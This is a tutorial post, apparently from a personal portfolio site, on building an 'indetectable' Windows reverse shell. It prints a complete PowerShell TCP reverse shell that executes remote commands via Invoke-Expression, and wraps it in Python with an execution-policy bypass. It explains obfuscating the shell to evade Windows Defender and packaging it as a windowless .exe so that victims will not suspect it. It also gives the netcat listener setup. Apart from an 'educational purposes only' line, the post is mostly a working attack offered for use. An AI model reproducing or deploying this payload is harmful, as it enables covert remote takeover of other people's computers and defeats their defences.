---
title: "Create an indetectable reverse shell for windows"
#excerpt: "Short description of portfolio item number 1<br/><img src='/images/500x300.png'>"
excerpt: "<b> Definitely not a backdoor... </b> <br/> <img src='/images/Portfolio/Create%20an%20indetectable%20reverse%20shell%20for%20windows/Indetectable%20reverse%20shell%20portada.png' width='300' height='auto'>"
collection: portfolio
---
First of all, this is a typical disclaimer:
"Educational purposes only"

So, let's get started.
First of all, we need:
- A Victim machine
- An Attacker machine 
- internet access and Python IDE of you choice

For the first step we copy the attacker's IP (`ip a`), and set the listener (in our case Netcat) to a port of your choice.
In my case, I prefer *9001*, so:
`nc -nlvp 9001`
And wait for the victim.

Meanwhile, we are going to create the reverse shell.
Let's navigate to [revshell](https://www.revshells.com/). There, we type the **attacker IP** the **attacker port** and choose **Powershell #1**

![Image](/images/Portfolio/Create%20an%20indetectable%20reverse%20shell%20for%20windows/Pasted%20image%2020250623160315.png)

If we try to copy this code into our IDE, Windows Defender will probably delete the script.
This is because Windows detects it as malware (obviously, it is).
So we need to obfuscate our malware, because we don't want Microsoft to delete our code.
We need to put everything into the variables with meaningless names.
To do that, I use ChatGPT.

>Obviously, this is a simple obfuscation, if you want to obfuscate this a little bit more, you can wrap this code inside a functional program. The objective of obfuscation is to bypass the system's defenses and avoid detection.

Okay, it's time to use our Python IDE.
Let's import the ``subprocess`` module in python (`import subprocess`)
Then, we create a variable like:
`payload = ''' OUR REVERSE SHELL ''' `


```python
subprocess.Popen([
    "powershell",
    "-ExecutionPolicy", "Bypass",
    "NoProfile",
    "-Command", payload
])
```


- `subprocess.Popen` → *This function executes a command in a new process*
- ``powershell`` → *This is the program that will be executed*
- ``"-ExecutionPolicy", "Bypass",`` → *Powershell parameters* 
	- ``-ExecutionPolicy Bypass`` → *This allows the execution of scripts without restrictions*
- ``NoProfile`` → *This prevents loading user's profile, avoiding personal configurations that might block the script*
- ``-Command, payload`` → *This is the command that will be executed in PowerShell, in this case the* ``payload`` *variable*.  


And that's the result.

```python
import subprocess

payload = '''
$A="Attacker IP";$B=Attacker PORT;$C=New-Object Net.Sockets.TCPClient($A,$B);$D=$C.GetStream();$E=New-Object IO.StreamReader($D);$F=New-Object IO.StreamWriter($D);$F.AutoFlush=$true;$G=New-Object System.Byte[] 1024;while($C.Connected){while($D.DataAvailable){$H=$D.Read($G,0,$G.Length);$I=([text.encoding]::UTF8).GetString($G,0,$H-1)};if($C.Connected -and $I.Length -gt 1){$J=try{Invoke-Expression ($I) 2>&1} catch{$_};$F.Write("$J`n");$I=$null}};$C.Close();$D.Close();$E.Close();$F.Close()
'''

subprocess.Popen([
    "powershell",
    "-ExecutionPolicy", "Bypass",
    "NoProfile",
    "-Command", payload
])

```

Okay, because we have a listener running on our attacker machine, we can execute our malicious script and obtain a reverse shell.

![Image](/images/Portfolio/Create%20an%20indetectable%20reverse%20shell%20for%20windows/Pasted%20image%2020250623190315.png)



Okay, but this is a ``.py`` script, and we want to convert it to a ``.exe`` so it doesn't look suspicious.

open the CMD or a Linux terminal and execute: 

``pip install -U pyinstaller``

then:

``pyinstaller --clean --onefile --windowed .\yourScript``

You have two options:
- Add pyinstaller to your system PATH
- Or execute the command from the pyinstaller installation directory
	- ``pyinstaller --clean --onefile --windowed "path to your script" "path where you want to drop your executable"``


![Image](/images/Portfolio/Create%20an%20indetectable%20reverse%20shell%20for%20windows/Pasted%20image%2020250623183859.png)

And when our victim executes the program, we get a reverse shell.

![Image](/images/Portfolio/Create%20an%20indetectable%20reverse%20shell%20for%20windows/Pasted%20image%2020250623190312.png)

